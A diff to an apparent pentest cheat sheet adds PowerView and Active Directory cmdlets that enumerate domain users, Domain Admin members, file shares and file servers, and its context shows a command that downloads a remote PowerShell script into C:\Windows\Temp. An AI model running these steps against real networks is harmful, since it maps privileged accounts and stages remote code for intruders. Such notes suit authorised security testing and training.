@@ -11,8 +11,8 @@ Get-Help Get-Item -Full
 Get-Help Get-Item -Examples
 ```
 #### Modules
-Import-Module modulepath
-Get-Command -Module <modulename>
+```Import-Module modulepath```
+```Get-Command -Module <modulename>```
 
 
 
@@ -64,6 +64,31 @@ OR If already running-
 ```(new-object System.Net.Webclient).DownloadFile("https://raw.githubusercontent.com/conma293/mvp/main/1.ps1", "C:\Windows\Temp\1.ps1")```
 
 # Powerview
+
+#### User Search
+```Get-DomainUser```
+```Get-DomainUser –Identity bob```
+
+```Get-ADUser -Filter * -Properties *```
+```Get-ADUser -Identity bob -Properties *```
+
+#### Group Membership
+```Get-DomainGroupMember -Identity "Domain Admin*" -Recurse```
+```Get-DomainGroupMember -Identity "Domain Admin*" | select GroupName, MemberName```
+
+```Get-ADGroupMember -Identity "Domain Admins" -Recursive```
+
+
+```Get-NetGroup –UserName "bob"```
+
+#### Shares, GPOs, etc
+
+
+```Invoke-ShareFinder –Verbose```
+```Invoke-ShareFinder -ExcludeStandard -ExcludePrint -ExcludeIPC –Verbose```
+```Invoke-FileFinder –Verbose```
+```Get-NetFileServer```
+
 
 #### User Hunting
 
